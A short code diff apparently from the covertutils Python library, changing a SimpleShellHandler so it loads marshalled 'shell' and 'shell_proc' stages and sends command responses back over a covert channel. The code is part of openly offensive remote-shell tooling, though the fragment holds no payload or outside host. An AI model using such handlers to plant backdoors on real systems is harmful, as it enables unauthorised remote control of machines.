@@ -10,7 +10,14 @@ from covertutils.handlers import FunctionDictHandler
 from covertutils.payloads import CommonStages
 
 
-_function_dict = { 'control' : CommonStages['shell']['function'], 'main' : CommonStages['shell']['function'] }
+pls = {
+	'control' : CommonStages['shell_proc']['marshal'],
+	'main' : CommonStages['shell']['marshal'],
+}
+# pls = {
+# 	'control' : CommonStages['shell']['marshal'],
+# 	'main' : CommonStages['shell']['marshal'],
+# }
 
 class SimpleShellHandler ( FunctionDictHandler ) :
 	"""
@@ -28,12 +35,12 @@ class SimpleShellHandler ( FunctionDictHandler ) :
 :param function send_function: A function that takes raw data as argument and sends it across.
 :param `orchestration.SimpleOrchestrator` orchestrator: An Object that is used to translate raw_data to `(stream, message)` tuples.
 		"""
-		super( SimpleShellHandler, self ).__init__( recv, send, orchestrator, function_dict =  _function_dict )
+		super( SimpleShellHandler, self ).__init__( recv, send, orchestrator, function_dict =  pls )
 
 
 	def onMessage( self, stream, message ) :
-		stream, resp = super( SimpleShellHandler, self ).onMessage( stream, message )
-		self.preferred_send( resp, stream )
+		resp = super( SimpleShellHandler, self ).onMessage( stream, message )
+		self.preferred_send( resp )
 
 
 	def onChunk( self, stream, message ) :
